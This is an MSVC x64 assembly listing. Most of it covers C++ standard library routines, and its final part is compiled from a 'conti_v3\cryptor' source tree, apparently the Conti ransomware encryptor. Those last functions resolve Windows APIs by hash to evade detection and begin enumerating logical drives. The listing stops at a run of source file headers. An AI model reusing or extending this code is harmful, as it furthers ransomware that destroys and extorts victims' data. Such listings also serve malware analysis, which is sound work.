	DD	0f007620bH
	DD	06003e005H
	DD	03002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Get_size_of_n@$01@std@@YA_K_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z DD 010401H
	DD	04204H
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_new.h
;	COMDAT ??2@YAPEAX_KPEAX@Z
_TEXT	SEGMENT
_Size$dead$ = 8
_Where$ = 16
??2@YAPEAX_KPEAX@Z PROC					; operator new, COMDAT

; 169  :         (void)_Size;
; 170  :         return _Where;

  00000	48 8b c2	 mov	 rax, rdx

; 171  :     }

  00003	c3		 ret	 0
??2@YAPEAX_KPEAX@Z ENDP					; operator new
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\limits
;	COMDAT ?max@?$numeric_limits@_J@std@@SA_JXZ
_TEXT	SEGMENT
?max@?$numeric_limits@_J@std@@SA_JXZ PROC		; std::numeric_limits<__int64>::max, COMDAT

; 636  :         return LLONG_MAX;

  00000	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH

; 637  :     }

  0000a	c3		 ret	 0
?max@?$numeric_limits@_J@std@@SA_JXZ ENDP		; std::numeric_limits<__int64>::max
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QEAA@QEBDH@Z
_TEXT	SEGMENT
this$ = 8
_Message$ = 16
__formal$ = 24
??0exception@std@@QEAA@QEBDH@Z PROC			; std::exception::exception, COMDAT

; 66   :     {

  00000	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_7exception@std@@6B@
  00007	48 89 01	 mov	 QWORD PTR [rcx], rax

; 67   :         _Data._What = _Message;
; 68   :     }

  0000a	48 8b c1	 mov	 rax, rcx
  0000d	48 c7 41 10 00
	00 00 00	 mov	 QWORD PTR [rcx+16], 0
  00015	48 89 51 08	 mov	 QWORD PTR [rcx+8], rdx
  00019	c3		 ret	 0
??0exception@std@@QEAA@QEBDH@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 48
_Other$ = 56
??0exception@std@@QEAA@AEBV01@@Z PROC			; std::exception::exception, COMDAT

; 72   :     {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  00006	48 8b d9	 mov	 rbx, rcx
  00009	48 8b c2	 mov	 rax, rdx
  0000c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  00013	0f 57 c0	 xorps	 xmm0, xmm0
  00016	48 8d 53 08	 lea	 rdx, QWORD PTR [rbx+8]
  0001a	48 89 0b	 mov	 QWORD PTR [rbx], rcx

; 73   :         __std_exception_copy(&_Other._Data, &_Data);

  0001d	48 8d 48 08	 lea	 rcx, QWORD PTR [rax+8]
  00021	0f 11 02	 movups	 XMMWORD PTR [rdx], xmm0
  00024	e8 00 00 00 00	 call	 __std_exception_copy

; 74   :     }

  00029	48 8b c3	 mov	 rax, rbx
  0002c	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00030	5b		 pop	 rbx
  00031	c3		 ret	 0
??0exception@std@@QEAA@AEBV01@@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??1exception@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1exception@std@@UEAA@XZ PROC				; std::exception::~exception, COMDAT

; 89   :     {

  00000	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_7exception@std@@6B@
  00007	48 89 01	 mov	 QWORD PTR [rcx], rax

; 90   :         __std_exception_destroy(&_Data);

  0000a	48 83 c1 08	 add	 rcx, 8
  0000e	e9 00 00 00 00	 jmp	 __std_exception_destroy
??1exception@std@@UEAA@XZ ENDP				; std::exception::~exception
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ?what@exception@std@@UEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?what@exception@std@@UEBAPEBDXZ PROC			; std::exception::what, COMDAT

; 95   :         return _Data._What ? _Data._What : "Unknown exception";

  00000	48 8b 51 08	 mov	 rdx, QWORD PTR [rcx+8]
  00004	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_C@_0BC@EOODALEL@Unknown?5exception@
  0000b	48 85 d2	 test	 rdx, rdx
  0000e	48 0f 45 c2	 cmovne	 rax, rdx

; 96   :     }

  00012	c3		 ret	 0
?what@exception@std@@UEBAPEBDXZ ENDP			; std::exception::what
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??_Gexception@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_Gexception@std@@UEAAPEAXI@Z PROC			; std::exception::`scalar deleting destructor', COMDAT
$LN9:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 89   :     {

  0000a	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_7exception@std@@6B@
  00011	48 8b f9	 mov	 rdi, rcx
  00014	48 89 01	 mov	 QWORD PTR [rcx], rax
  00017	8b da		 mov	 ebx, edx

; 90   :         __std_exception_destroy(&_Data);

  00019	48 83 c1 08	 add	 rcx, 8
  0001d	e8 00 00 00 00	 call	 __std_exception_destroy
  00022	f6 c3 01	 test	 bl, 1
  00025	74 0d		 je	 SHORT $LN6@scalar
  00027	ba 18 00 00 00	 mov	 edx, 24
  0002c	48 8b cf	 mov	 rcx, rdi
  0002f	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN6@scalar:
  00034	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  00039	48 8b c7	 mov	 rax, rdi
  0003c	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00040	5f		 pop	 rdi
  00041	c3		 ret	 0
??_Gexception@std@@UEAAPEAXI@Z ENDP			; std::exception::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0bad_alloc@std@@AEAA@QEBD@Z
_TEXT	SEGMENT
this$ = 8
_Message$ = 16
??0bad_alloc@std@@AEAA@QEBD@Z PROC			; std::bad_alloc::bad_alloc, COMDAT

; 130  :     {

  00000	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_7bad_alloc@std@@6B@

; 65   :         : _Data()

  00007	48 c7 41 10 00
	00 00 00	 mov	 QWORD PTR [rcx+16], 0

; 130  :     {

  0000f	48 89 01	 mov	 QWORD PTR [rcx], rax

; 131  :     }

  00012	48 8b c1	 mov	 rax, rcx

; 67   :         _Data._What = _Message;

  00015	48 89 51 08	 mov	 QWORD PTR [rcx+8], rdx

; 131  :     }

  00019	c3		 ret	 0
??0bad_alloc@std@@AEAA@QEBD@Z ENDP			; std::bad_alloc::bad_alloc
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??_Gbad_alloc@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_Gbad_alloc@std@@UEAAPEAXI@Z PROC			; std::bad_alloc::`scalar deleting destructor', COMDAT
$LN12:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 89   :     {

  0000a	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_7exception@std@@6B@
  00011	48 8b f9	 mov	 rdi, rcx
  00014	48 89 01	 mov	 QWORD PTR [rcx], rax
  00017	8b da		 mov	 ebx, edx

; 90   :         __std_exception_destroy(&_Data);

  00019	48 83 c1 08	 add	 rcx, 8
  0001d	e8 00 00 00 00	 call	 __std_exception_destroy
  00022	f6 c3 01	 test	 bl, 1
  00025	74 0d		 je	 SHORT $LN8@scalar
  00027	ba 18 00 00 00	 mov	 edx, 24
  0002c	48 8b cf	 mov	 rcx, rdi
  0002f	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN8@scalar:
  00034	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  00039	48 8b c7	 mov	 rax, rdi
  0003c	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00040	5f		 pop	 rdi
  00041	c3		 ret	 0
??_Gbad_alloc@std@@UEAAPEAXI@Z ENDP			; std::bad_alloc::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??1bad_alloc@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1bad_alloc@std@@UEAA@XZ PROC				; std::bad_alloc::~bad_alloc, COMDAT

; 89   :     {

  00000	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_7exception@std@@6B@
  00007	48 89 01	 mov	 QWORD PTR [rcx], rax

; 90   :         __std_exception_destroy(&_Data);

  0000a	48 83 c1 08	 add	 rcx, 8
  0000e	e9 00 00 00 00	 jmp	 __std_exception_destroy
??1bad_alloc@std@@UEAA@XZ ENDP				; std::bad_alloc::~bad_alloc
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0bad_array_new_length@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0bad_array_new_length@std@@QEAA@XZ PROC		; std::bad_array_new_length::bad_array_new_length, COMDAT

; 67   :         _Data._What = _Message;

  00000	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
  00007	48 c7 41 10 00
	00 00 00	 mov	 QWORD PTR [rcx+16], 0
  0000f	48 89 41 08	 mov	 QWORD PTR [rcx+8], rax

; 141  :     {

  00013	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_7bad_array_new_length@std@@6B@
  0001a	48 89 01	 mov	 QWORD PTR [rcx], rax

; 142  :     }

  0001d	48 8b c1	 mov	 rax, rcx
  00020	c3		 ret	 0
??0bad_array_new_length@std@@QEAA@XZ ENDP		; std::bad_array_new_length::bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??_Gbad_array_new_length@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_Gbad_array_new_length@std@@UEAAPEAXI@Z PROC		; std::bad_array_new_length::`scalar deleting destructor', COMDAT
$LN14:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 89   :     {

  0000a	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_7exception@std@@6B@
  00011	48 8b f9	 mov	 rdi, rcx
  00014	48 89 01	 mov	 QWORD PTR [rcx], rax
  00017	8b da		 mov	 ebx, edx

; 90   :         __std_exception_destroy(&_Data);

  00019	48 83 c1 08	 add	 rcx, 8
  0001d	e8 00 00 00 00	 call	 __std_exception_destroy
  00022	f6 c3 01	 test	 bl, 1
  00025	74 0d		 je	 SHORT $LN10@scalar
  00027	ba 18 00 00 00	 mov	 edx, 24
  0002c	48 8b cf	 mov	 rcx, rdi
  0002f	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN10@scalar:
  00034	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  00039	48 8b c7	 mov	 rax, rdi
  0003c	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00040	5f		 pop	 rdi
  00041	c3		 ret	 0
??_Gbad_array_new_length@std@@UEAAPEAXI@Z ENDP		; std::bad_array_new_length::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??1bad_array_new_length@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1bad_array_new_length@std@@UEAA@XZ PROC		; std::bad_array_new_length::~bad_array_new_length, COMDAT

; 89   :     {

  00000	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_7exception@std@@6B@
  00007	48 89 01	 mov	 QWORD PTR [rcx], rax

; 90   :         __std_exception_destroy(&_Data);

  0000a	48 83 c1 08	 add	 rcx, 8
  0000e	e9 00 00 00 00	 jmp	 __std_exception_destroy
??1bad_array_new_length@std@@UEAA@XZ ENDP		; std::bad_array_new_length::~bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Throw_bad_array_new_length@std@@YAXXZ
_TEXT	SEGMENT
$T1 = 32
?_Throw_bad_array_new_length@std@@YAXXZ PROC		; std::_Throw_bad_array_new_length, COMDAT

; 63   : [[noreturn]] inline void _Throw_bad_array_new_length() {

$LN4:
  00000	48 83 ec 48	 sub	 rsp, 72			; 00000048H

; 64   :     _THROW(bad_array_new_length{});

  00004	48 8d 4c 24 20	 lea	 rcx, QWORD PTR $T1[rsp]
  00009	e8 00 00 00 00	 call	 ??0bad_array_new_length@std@@QEAA@XZ ; std::bad_array_new_length::bad_array_new_length
  0000e	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:_TI3?AVbad_array_new_length@std@@
  00015	48 8d 4c 24 20	 lea	 rcx, QWORD PTR $T1[rsp]
  0001a	e8 00 00 00 00	 call	 _CxxThrowException
  0001f	cc		 int	 3
$LN3@Throw_bad_:
?_Throw_bad_array_new_length@std@@YAXXZ ENDP		; std::_Throw_bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0bad_array_new_length@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 48
__that$ = 56
??0bad_array_new_length@std@@QEAA@AEBV01@@Z PROC	; std::bad_array_new_length::bad_array_new_length, COMDAT
$LN9:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  00006	48 8b d9	 mov	 rbx, rcx
  00009	48 8b c2	 mov	 rax, rdx

; 72   :     {

  0000c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  00013	0f 57 c0	 xorps	 xmm0, xmm0

; 71   :         : _Data()

  00016	48 8d 53 08	 lea	 rdx, QWORD PTR [rbx+8]

; 72   :     {

  0001a	48 89 0b	 mov	 QWORD PTR [rbx], rcx

; 73   :         __std_exception_copy(&_Other._Data, &_Data);

  0001d	48 8d 48 08	 lea	 rcx, QWORD PTR [rax+8]
  00021	0f 11 02	 movups	 XMMWORD PTR [rdx], xmm0
  00024	e8 00 00 00 00	 call	 __std_exception_copy
  00029	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_7bad_array_new_length@std@@6B@
  00030	48 89 03	 mov	 QWORD PTR [rbx], rax
  00033	48 8b c3	 mov	 rax, rbx
  00036	48 83 c4 20	 add	 rsp, 32			; 00000020H
  0003a	5b		 pop	 rbx
  0003b	c3		 ret	 0
??0bad_array_new_length@std@@QEAA@AEBV01@@Z ENDP	; std::bad_array_new_length::bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0bad_alloc@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 48
__that$ = 56
??0bad_alloc@std@@QEAA@AEBV01@@Z PROC			; std::bad_alloc::bad_alloc, COMDAT
$LN7:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  00006	48 8b d9	 mov	 rbx, rcx
  00009	48 8b c2	 mov	 rax, rdx

; 72   :     {

  0000c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  00013	0f 57 c0	 xorps	 xmm0, xmm0

; 71   :         : _Data()

  00016	48 8d 53 08	 lea	 rdx, QWORD PTR [rbx+8]

; 72   :     {

  0001a	48 89 0b	 mov	 QWORD PTR [rbx], rcx

; 73   :         __std_exception_copy(&_Other._Data, &_Data);

  0001d	48 8d 48 08	 lea	 rcx, QWORD PTR [rax+8]
  00021	0f 11 02	 movups	 XMMWORD PTR [rdx], xmm0
  00024	e8 00 00 00 00	 call	 __std_exception_copy
  00029	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_7bad_alloc@std@@6B@
  00030	48 89 03	 mov	 QWORD PTR [rbx], rax
  00033	48 8b c3	 mov	 rax, rbx
  00036	48 83 c4 20	 add	 rsp, 32			; 00000020H
  0003a	5b		 pop	 rbx
  0003b	c3		 ret	 0
??0bad_alloc@std@@QEAA@AEBV01@@Z ENDP			; std::bad_alloc::bad_alloc
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z
_TEXT	SEGMENT
_Bytes$ = 8
?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z PROC ; std::_Default_allocate_traits::_Allocate, COMDAT

; 90   :         return ::operator new(_Bytes);

  00000	e9 00 00 00 00	 jmp	 ??2@YAPEAX_K@Z		; operator new
?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ENDP ; std::_Default_allocate_traits::_Allocate
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z
_TEXT	SEGMENT
_Ptr$ = 48
_Bytes$ = 56
?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z PROC ; std::_Adjust_manually_vector_aligned, COMDAT

; 158  : inline void _Adjust_manually_vector_aligned(void*& _Ptr, size_t& _Bytes) {

$LN13:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 159  :     // adjust parameters from _Allocate_manually_vector_aligned to pass to operator delete
; 160  :     _Bytes += _Non_user_size;

  00004	48 83 02 27	 add	 QWORD PTR [rdx], 39	; 00000027H

; 161  : 
; 162  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00008	48 8b 01	 mov	 rax, QWORD PTR [rcx]
  0000b	48 8b 50 f8	 mov	 rdx, QWORD PTR [rax-8]

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  0000f	48 2b c2	 sub	 rax, rdx

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00012	48 83 c0 f8	 add	 rax, -8
  00016	48 83 f8 1f	 cmp	 rax, 31
  0001a	77 08		 ja	 SHORT $LN7@Adjust_man

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  0001c	48 89 11	 mov	 QWORD PTR [rcx], rdx

; 179  : }

  0001f	48 83 c4 28	 add	 rsp, 40			; 00000028H
  00023	c3		 ret	 0
$LN7@Adjust_man:

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00024	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00029	cc		 int	 3
$LN11@Adjust_man:
?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ENDP ; std::_Adjust_manually_vector_aligned
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Orphan_all@_Container_base0@std@@QEAAXXZ
_TEXT	SEGMENT
this$dead$ = 8
?_Orphan_all@_Container_base0@std@@QEAAXXZ PROC		; std::_Container_base0::_Orphan_all, COMDAT

; 1176 :     _CONSTEXPR20 void _Orphan_all() noexcept {}

  00000	c2 00 00	 ret	 0
?_Orphan_all@_Container_base0@std@@QEAAXXZ ENDP		; std::_Container_base0::_Orphan_all
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z
_TEXT	SEGMENT
this$dead$ = 8
__formal$dead$ = 16
?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z PROC ; std::_Container_base0::_Alloc_proxy, COMDAT

; 1178 :     _CONSTEXPR20 void _Alloc_proxy(const _Fake_allocator&) noexcept {}

  00000	c2 00 00	 ret	 0
?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ENDP ; std::_Container_base0::_Alloc_proxy
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Xlen_string@std@@YAXXZ
_TEXT	SEGMENT
?_Xlen_string@std@@YAXXZ PROC				; std::_Xlen_string, COMDAT

; 2326 : [[noreturn]] inline void _Xlen_string() {

$LN4:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 2327 :     _Xlength_error("string too long");

  00004	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_C@_0BA@JFNIOLAK@string?5too?5long@
  0000b	e8 00 00 00 00	 call	 ?_Xlength_error@std@@YAXPEBD@Z ; std::_Xlength_error
  00010	cc		 int	 3
$LN3@Xlen_strin:
?_Xlen_string@std@@YAXXZ ENDP				; std::_Xlen_string
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?plstrlenW@@YAHPEB_W@Z
_TEXT	SEGMENT
lpString$ = 48
?plstrlenW@@YAHPEB_W@Z PROC				; plstrlenW, COMDAT

; 58   : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 59   : 	INT(WINAPI * pFunction)(LPCWSTR);
; 60   : 	pFunction = (INT(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe27a325f, 108);//GetProcAddress(hKernel32, OBFA("lstrlenW"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 5f 32 7a
	e2		 mov	 r8d, -495308193		; e27a325fH
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 5d	 lea	 r9d, QWORD PTR [rdx+93]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 61   : 	return pFunction(lpString);

  0001d	48 8b cb	 mov	 rcx, rbx

; 62   : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 61   : 	return pFunction(lpString);

  00025	48 ff e0	 rex_jmp rax
?plstrlenW@@YAHPEB_W@Z ENDP				; plstrlenW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGetLogicalDriveStringsW@@YAKKPEA_W@Z
_TEXT	SEGMENT
nBufferLength$ = 48
lpBuffer$ = 56
?pGetLogicalDriveStringsW@@YAKKPEA_W@Z PROC		; pGetLogicalDriveStringsW, COMDAT

; 68   : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 69   : 	DWORD(WINAPI * pFunction)(DWORD, LPWSTR);
; 70   : 	pFunction = (DWORD(WINAPI*)(DWORD, LPWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe6371b26, 107);//GetProcAddress(hKernel32, OBFA("GetLogicalDriveStringsW"));

  0000d	41 b8 26 1b 37
	e6		 mov	 r8d, -432596186		; e6371b26H
  00013	ba 0f 00 00 00	 mov	 edx, 15
  00018	8b f9		 mov	 edi, ecx
  0001a	44 8d 4a 5c	 lea	 r9d, QWORD PTR [rdx+92]
  0001e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 71   : 	return pFunction(nBufferLength, lpBuffer);

  00023	48 8b d3	 mov	 rdx, rbx
  00026	8b cf		 mov	 ecx, edi

; 72   : }

  00028	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002d	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00031	5f		 pop	 rdi

; 71   : 	return pFunction(nBufferLength, lpBuffer);

  00032	48 ff e0	 rex_jmp rax
?pGetLogicalDriveStringsW@@YAKKPEA_W@Z ENDP		; pGetLogicalDriveStringsW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
